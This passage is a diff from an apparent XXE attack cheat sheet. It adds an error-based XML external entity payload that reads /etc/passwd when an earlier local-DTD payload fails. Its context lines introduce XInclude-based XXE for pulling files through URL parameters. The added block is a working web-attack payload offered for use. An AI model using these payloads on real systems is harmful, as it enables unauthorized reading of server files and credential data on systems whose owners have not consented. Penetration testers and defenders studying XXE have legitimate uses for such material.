@@ -196,6 +196,13 @@ Now use this payload with identified dtd.
 %local_dtd;
 ]>
 ```
+or use this if not working
+```
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
+%eval;
+%exfil;
+```
 ### Hidden XXE attack surface via exploiting XInclude to retrieve files
 Some applications receive client-submitted data via parameter value(id=1) without xml body, embed it on the server-side into an XML document, and then parse the document. In this situation try this method. Use ```&xxe; (encode & to %26)``` to parameter value(id=&xxe;) to identify xxe via error message. Then place this payload in value to retrieve file.
 ```xml
